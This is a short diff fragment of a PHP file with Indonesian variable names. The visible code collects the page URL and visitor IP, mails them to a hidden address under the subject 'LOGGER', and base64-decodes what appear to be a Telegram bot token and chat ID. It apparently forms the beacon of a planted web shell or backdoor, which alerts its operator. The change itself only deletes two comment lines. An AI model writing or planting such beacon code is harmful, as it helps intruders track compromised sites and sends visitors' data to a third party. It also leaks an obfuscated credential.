@@ -6,9 +6,6 @@ $x_path = "http://" . ($_SERVER['SERVER_NAME'] ?? '') . ($_SERVER['REQUEST_URI']
 $ip = $_SERVER['REMOTE_ADDR'] ?? '-';
 $pesan_alert = "fix {$x_path} :p *IP Address : [ {$ip} ]";
 @mail($tujuanmail, "LOGGER", $pesan_alert, "[ {$ip} ]");
-
-/* ================= TELEGRAM — 2 BOT ================= */
-// Bot 1 (lama)
 $tk1  = base64_decode("ODczNjg5MzQ2ODpBQUgwUmlSMHpMM1FFeVl0eTQ4eTFTYkVWSnItbVFBLUNrUQ==");
 $cid1 = base64_decode("ODkzMDE3NDQ2Mw==");
 
